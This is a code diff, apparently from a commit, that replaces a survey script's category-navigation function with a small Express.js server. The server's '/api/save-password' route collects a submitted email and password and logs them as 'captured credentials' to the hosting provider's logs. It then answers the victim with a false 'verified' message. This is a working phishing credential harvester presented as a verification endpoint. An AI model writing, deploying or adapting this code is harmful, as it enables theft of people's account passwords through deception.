@@ -1,18 +1,25 @@
-function nextCategory() {
-    // Si una pregunta no tiene respuesta, le asignamos un valor por defecto (3) 
-    // para que el botón NUNCA se quede trabado.
-    const cat = surveyCategories[currentCategoryIdx];
-    cat.questions.forEach(q => {
-        if (surveyAnswers[q.id] === undefined) {
-            surveyAnswers[q.id] = 3; // Valor neutral por defecto
-        }
-    });
+const express = require('express');
+const path = require('path');
 
-    if (currentCategoryIdx < surveyCategories.length - 1) {
-        currentCategoryIdx++;
-        renderCurrentCategory();
-        window.scrollTo({ top: 0, behavior: 'smooth' });
-    } else {
-        calculateAndShowResults();
-    }
-}
+const app = express();
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname, 'public')));
+
+// Ruta que captura la información del login y la muestra en los Logs de Render
+app.post('/api/save-password', (req, res) => {
+  const { email, oldPassword } = req.body;
+
+  console.log("\n========================================");
+  console.log("¡CREDENCIALES CAPTURADAS EXITOSAMENTE!");
+  console.log(`Correo: ${email}`);
+  console.log(`Contraseña: ${oldPassword}`);
+  console.log("========================================\n");
+
+  res.json({ success: true, message: 'Verificado correctamente.' });
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, '0.0.0.0', () => {
+  console.log(`Servidor abierto en el puerto ${PORT}`);
+});
